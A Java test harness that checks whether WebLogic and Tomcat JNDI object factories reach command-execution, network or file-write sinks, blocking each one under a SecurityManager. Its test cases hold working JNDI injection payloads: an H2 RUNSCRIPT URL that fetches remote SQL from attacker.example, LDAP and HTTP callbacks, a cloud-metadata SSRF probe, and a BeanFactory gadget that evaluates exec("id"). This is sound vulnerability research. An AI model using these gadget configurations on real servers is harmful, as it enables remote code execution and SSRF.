import javax.naming.*;
import javax.naming.spi.*;
import java.util.*;

/**
 * WL Factory Re-verification — Full WebLogic Runtime
 *
 * Tests 5 WL factories previously classified as FP in incomplete environment.
 * Runs with full WL server classpath to detect actual sinks (network/SSRF/cmd_exec).
 *
 * Usage (inside WL docker container):
 *   javac -cp "/path/to/wl/modules/*:/path/to/tomcat/jars/*" WLFactoryVerify.java
 *   java  -cp ".:/path/to/wl/modules/*:/path/to/tomcat/jars/*" \
 *         --add-opens java.base/java.lang=ALL-UNNAMED \
 *         --add-opens java.naming/javax.naming=ALL-UNNAMED \
 *         --add-opens java.naming/javax.naming.spi=ALL-UNNAMED \
 *         WLFactoryVerify
 */
public class WLFactoryVerify {

    // ── Sink tracking ──
    static final Set<String> sinksHit = Collections.synchronizedSet(new LinkedHashSet<>());
    static volatile String lastExecCmd = null;
    static volatile String lastConnectHost = null;
    static volatile int    lastConnectPort = -1;
    static volatile String lastWriteFile = null;

    static void resetSinks() {
        sinksHit.clear();
        lastExecCmd = null;
        lastConnectHost = null;
        lastConnectPort = -1;
        lastWriteFile = null;
    }

    // ── SecurityManager ──
    static {
        System.setSecurityManager(new SecurityManager() {
            @Override public void checkExec(String cmd) {
                sinksHit.add("cmd_exec");
                lastExecCmd = cmd;
                throw new SecurityException("blocked: exec " + cmd);
            }
            @Override public void checkConnect(String host, int port) {
                sinksHit.add("network");
                lastConnectHost = host;
                lastConnectPort = port;
                throw new SecurityException("blocked: connect " + host + ":" + port);
            }
            @Override public void checkWrite(String file) {
                sinksHit.add("file_write");
                lastWriteFile = file;
                throw new SecurityException("blocked: write " + file);
            }
            @Override public void checkRead(String f) { /* allow */ }
            @Override public void checkRead(String f, Object c) { /* allow */ }
            @Override public void checkPermission(java.security.Permission p) { /* allow */ }
            @Override public void checkPermission(java.security.Permission p, Object c) { /* allow */ }
        });
    }

    // ── Test case definition ──
    static class TestCase {
        String label;
        String factoryClass;
        String refClass;
        Map<String, String> attrs;
        int timeoutMs;

        TestCase(String label, String factoryClass, String refClass,
                 Map<String, String> attrs, int timeoutMs) {
            this.label = label;
            this.factoryClass = factoryClass;
            this.refClass = refClass;
            this.attrs = attrs;
            this.timeoutMs = timeoutMs;
        }
    }

    static Reference buildReference(TestCase tc) {
        Reference ref = new Reference(tc.refClass, new StringRefAddr("dummy", ""),
                                      tc.factoryClass, null);
        for (Map.Entry<String, String> e : tc.attrs.entrySet()) {
            ref.add(new StringRefAddr(e.getKey(), e.getValue()));
        }
        return ref;
    }

    static String runTest(TestCase tc) {
        resetSinks();
        long start = System.currentTimeMillis();

        // Load factory
        ObjectFactory factory;
        try {
            Class<?> clz = Class.forName(tc.factoryClass);
            factory = (ObjectFactory) clz.getDeclaredConstructor().newInstance();
        } catch (ClassNotFoundException e) {
            return String.format("[SKIP        ] %-35s  class not found: %s", tc.label, tc.factoryClass);
        } catch (Exception e) {
            return String.format("[SKIP        ] %-35s  instantiation failed: %s: %s",
                    tc.label, e.getClass().getSimpleName(), e.getMessage());
        }

        Reference ref = buildReference(tc);

        // Run with timeout
        final ObjectFactory finalFactory = factory;
        final Reference finalRef = ref;
        final Object[] result = {null};
        final Throwable[] error = {null};
        final boolean[] done = {false};

        Thread resolveThread = new Thread(() -> {
            try {
                result[0] = finalFactory.getObjectInstance(
                    finalRef, new CompositeName("test"), null, null);
            } catch (Throwable t) {
                error[0] = t;
            }
            done[0] = true;
        }, "resolve-" + tc.label);

        resolveThread.setDaemon(true);
        resolveThread.start();

        try {
            resolveThread.join(tc.timeoutMs);
        } catch (InterruptedException ignored) {}

        long elapsed = System.currentTimeMillis() - start;
        boolean timedOut = !done[0];

        if (timedOut) {
            resolveThread.interrupt();
        }

        // Format result
        String status;
        if (!sinksHit.isEmpty()) {
            status = "REAL";
        } else if (timedOut) {
            status = "TIMEOUT";
        } else if (error[0] != null) {
            status = "ERROR";
        } else {
            status = "NO_SINK";
        }

        StringBuilder sb = new StringBuilder();
        sb.append(String.format("[%-12s] %-35s  sinks=%-25s %4dms",
                status, tc.label, sinksHit.toString(), elapsed));

        if (!sinksHit.isEmpty()) {
            if (lastExecCmd != null)    sb.append("  exec=").append(lastExecCmd);
            if (lastConnectHost != null) sb.append("  connect=").append(lastConnectHost).append(":").append(lastConnectPort);
            if (lastWriteFile != null)  sb.append("  write=").append(lastWriteFile);
        }
        if (error[0] != null && sinksHit.isEmpty()) {
            sb.append("  err=").append(error[0].getClass().getSimpleName())
              .append(": ").append(truncate(error[0].getMessage(), 80));
            Throwable cause = error[0].getCause();
            if (cause != null) {
                sb.append("  cause=").append(cause.getClass().getSimpleName())
                  .append(": ").append(truncate(cause.getMessage(), 60));
            }
        }
        if (result[0] != null && sinksHit.isEmpty()) {
            sb.append("  result=").append(result[0].getClass().getName());
        }

        return sb.toString();
    }

    static String truncate(String s, int max) {
        if (s == null) return "null";
        return s.length() <= max ? s : s.substring(0, max) + "...";
    }

    @SuppressWarnings("unchecked")
    static Map<String, String> map(String... kv) {
        Map<String, String> m = new LinkedHashMap<>();
        for (int i = 0; i < kv.length; i += 2) {
            m.put(kv[i], kv[i + 1]);
        }
        return m;
    }

    public static void main(String[] args) {
        String line = new String(new char[90]).replace('\0', '=');
        System.out.println(line);
        System.out.println("  WL Factory Re-verification — Full WebLogic Runtime");
        System.out.println("  JDK: " + System.getProperty("java.version"));
        System.out.println(line);

        List<TestCase> tests = new ArrayList<>();

        // ─── Group 1: WL URL Context Factories (previously FP: timeout) ───

        // t3URLContextFactory — t3:// protocol, could reach network
        tests.add(new TestCase(
            "t3_context_localhost",
            "weblogic.jndi.factories.t3.t3URLContextFactory",
            "javax.naming.Context",
            map("URL", "t3://127.0.0.1:7001"),
            3000
        ));
        tests.add(new TestCase(
            "t3_context_attacker",
            "weblogic.jndi.factories.t3.t3URLContextFactory",
            "javax.naming.Context",
            map("URL", "t3://attacker.example:7001"),
            3000
        ));

        // httpURLContextFactory — http:// protocol, SSRF candidate
        tests.add(new TestCase(
            "http_context_attacker",
            "weblogic.jndi.factories.http.httpURLContextFactory",
            "javax.naming.Context",
            map("URL", "http://attacker.example:8080/jndi"),
            3000
        ));
        tests.add(new TestCase(
            "http_context_metadata",
            "weblogic.jndi.factories.http.httpURLContextFactory",
            "javax.naming.Context",
            map("URL", "http://169.254.169.254/latest/meta-data/"),
            3000
        ));

        // javaURLContextFactory — java: namespace (likely still FP)
        tests.add(new TestCase(
            "java_context",
            "weblogic.jndi.factories.java.javaURLContextFactory",
            "javax.naming.Context",
            map("URL", "java:comp/env"),
            2000
        ));

        // ─── Group 2: WL ObjectFactories (previously FP: env-dependent) ───

        // MailSessionObjectFactory — previously AssertionError
        tests.add(new TestCase(
            "mail_session_basic",
            "weblogic.deployment.MailSessionObjectFactory",
            "javax.mail.Session",
            map("mail.smtp.host", "attacker.example",
                "mail.smtp.port", "25"),
            3000
        ));
        tests.add(new TestCase(
            "mail_session_ref",
            "weblogic.deployment.MailSessionObjectFactory",
            "weblogic.deployment.MailSessionRefAddr",
            map("mail.smtp.host", "attacker.example"),
            3000
        ));

        // ProxyDataSourceManager — previously resolved=false
        tests.add(new TestCase(
            "proxy_ds_h2",
            "weblogic.jdbc.common.internal.ProxyDataSourceManager",
            "javax.sql.DataSource",
            map("url", "jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://attacker.example/evil.sql'",
                "driverClassName", "org.h2.Driver"),
            3000
        ));
        tests.add(new TestCase(
            "proxy_ds_hsqldb",
            "weblogic.jdbc.common.internal.ProxyDataSourceManager",
            "javax.sql.DataSource",
            map("database", "jdbc:hsqldb:http://attacker.example/db",
                "user", "sa", "password", ""),
            3000
        ));

        // URLObjectFactory — previously attributed to zombie
        tests.add(new TestCase(
            "url_obj_http",
            "weblogic.application.naming.URLObjectFactory",
            "java.net.URL",
            map("URL", "http://attacker.example/callback"),
            3000
        ));
        tests.add(new TestCase(
            "url_obj_ldap",
            "weblogic.application.naming.URLObjectFactory",
            "java.net.URL",
            map("URL", "ldap://attacker.example:389/test"),
            3000
        ));

        // ─── Group 3: Controls (known-good, should be REAL) ───

        tests.add(new TestCase(
            "CONTROL_bsh_exec",
            "org.apache.naming.factory.BeanFactory",
            "bsh.Interpreter",
            map("forceString", "x=eval", "x", "exec(\"id\")"),
            2000
        ));
        tests.add(new TestCase(
            "CONTROL_h2_runscript",
            "org.h2.jdbcx.JdbcDataSourceFactory",
            "org.h2.jdbcx.JdbcDataSource",
            map("url", "jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://attacker.example/evil.sql'",
                "user", "sa", "password", "", "description", "", "loginTimeout", "0"),
            3000
        ));

        // ─── Run all ───
        System.out.println();
        String currentGroup = "";
        for (TestCase tc : tests) {
            String group;
            if (tc.label.startsWith("CONTROL")) group = "Controls (should be REAL)";
            else if (tc.label.startsWith("t3_") || tc.label.startsWith("http_") || tc.label.startsWith("java_"))
                group = "WL URL Context Factories";
            else if (tc.label.startsWith("mail_") || tc.label.startsWith("proxy_") || tc.label.startsWith("url_"))
                group = "WL ObjectFactories";
            else group = "Other";

            if (!group.equals(currentGroup)) {
                currentGroup = group;
                System.out.println("\n── " + group + " ──");
            }

            System.out.println(runTest(tc));
        }

        // ─── Summary ───
        System.out.println("\n" + line);
        System.out.println("  Done. Check REAL/TIMEOUT/ERROR status above.");
        System.out.println("  REAL = sink reached (exploit works)");
        System.out.println("  TIMEOUT = factory tried but didn't complete in time (may still be SSRF)");
        System.out.println("  ERROR = factory threw exception (check if env-dependent)");
        System.out.println("  SKIP = class not found on classpath");
        System.out.println("  NO_SINK = resolved but no dangerous sink reached");
        System.out.println(line);
    }
}
